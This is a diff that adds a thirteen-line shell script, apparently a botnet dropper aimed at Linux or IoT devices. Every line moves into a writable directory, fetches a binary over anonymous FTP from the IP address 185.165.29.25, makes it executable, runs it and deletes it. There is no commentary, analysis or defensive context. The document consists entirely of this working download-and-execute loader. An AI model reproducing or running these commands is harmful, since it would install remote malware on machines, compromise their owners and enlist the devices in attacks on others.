@@ -1,0 +1,13 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 mba mba; chmod 777 mba ./mba; rm -rf mba
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 ebs ebs; chmod 777 ebs ./ebs; rm -rf ebs
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 ew ew; chmod 777 ew ./ew; rm -rf ew
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 aw aw; chmod 777 aw ./aw; rm -rf aw
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 ftr ftr; chmod 777 ftr ./ftr; rm -rf ftr
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 er er; chmod 777 er ./er; rm -rf er
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 re re; chmod 777 re ./re; rm -rf re
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 ty ty; chmod 777 ty ./ty; rm -rf ty
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 ke ke; chmod 777 ke ./ke; rm -rf ke
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 as as; chmod 777 as ./as; rm -rf as
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 fg fg; chmod 777 fg ./fg; rm -rf fg
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 sddf sddf; chmod 777 sddf ./sddf; rm -rf sddf
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.25 tel tel; chmod 777 tel ./tel; rm -rf tel
